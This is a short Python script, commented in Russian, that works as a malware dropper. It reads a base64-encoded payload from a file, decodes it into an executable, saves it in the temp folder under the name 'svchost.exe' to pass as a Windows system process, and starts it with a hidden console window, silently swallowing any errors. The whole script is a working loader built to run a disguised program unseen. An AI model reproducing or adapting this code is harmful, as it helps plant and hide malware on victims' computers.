import base64
import os
import subprocess
import tempfile

def main():
    try:
        # Скачиваем payload.txt с твоего GitHub (или кладем рядом)
        # Для простоты считаем, что payload.txt лежит в той же папке
        with open("payload.txt", "r") as f:
            encoded = f.read()
            
        # Расшифровываем и запускаем
        decoded = base64.b64decode(encoded)
        
        temp_dir = tempfile.gettempdir()
        exe_path = os.path.join(temp_dir, "svchost.exe")
        
        with open(exe_path, "wb") as f:
            f.write(decoded)
            
        subprocess.Popen([exe_path], creationflags=0x08000000)
    except: pass

if __name__ == "__main__":
    main()
